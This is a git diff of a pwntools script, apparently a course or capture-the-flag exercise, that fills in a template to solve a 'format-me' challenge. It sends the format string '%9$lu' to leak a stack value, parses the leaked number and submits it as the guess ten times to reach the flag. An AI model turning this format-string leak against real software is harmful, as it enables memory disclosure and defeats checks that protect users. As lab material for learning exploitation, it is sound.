@@ -1,23 +1,38 @@
 #!/usr/bin/env python3
 from pwn import *
-
 context.terminal = ['tmux', 'splitw', '-h']
-exe = ELF("./format-me-test")
-
+# exe = ELF("./format-me-test")
+exe = ELF("./format-me")
 r = process([exe.path])
 # r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line
 
-for _ in range(10):
-    # Add your code Here
-    r.recvuntil(b"xxx") # Think about what should be received first?
-    r.sendline(b"xxx") # Add your format string code here!
-    leak = r.recvline()
-    # Add your code to receive leak val here , format: val = leak[idx_1:idx_2], please think about the idx
-    val = leak[idx_1:idx_2] # you need to fill in idx_1, and idx_2 by yourself
-    
-    r.recvuntil(b"xxx") #Think about what should be received?
-    r.sendline(val) 
-    r.recvuntil(b"Correct")
+INDEX = 9
+FMT = f"%{INDEX}$lu".encode()
 
-r.recvuntil(b"Here's your flag: ")
+for _ in range(10):
+    r.recvuntil(b"Recipient? ")
+    r.sendline(FMT)
+
+    r.recvuntil(b"Sending to ")
+    leak_block = r.recvuntil(b"...\n")  
+   
+    if leak_block.endswith(b"...\n"):
+        leaked_bytes = leak_block[:-4]
+    else:
+        leaked_bytes = leak_block
+
+    
+    m = re.search(rb"(-?\d+)", leaked_bytes)
+    if not m:
+        log.failure(f"No numeric leak found. raw: {leaked_bytes!r}")
+        r.close()
+        raise SystemExit("Leak failed; verify INDEX or run dump_offsets.py")
+    val = m.group(1).decode()  
+
+    
+    r.recvuntil(b"Guess? ")
+    r.sendline(val.encode())
+
+    # wait for confirmation of correct guess
+r.recvuntil(b"Correct code! Package sent.")
 r.interactive()
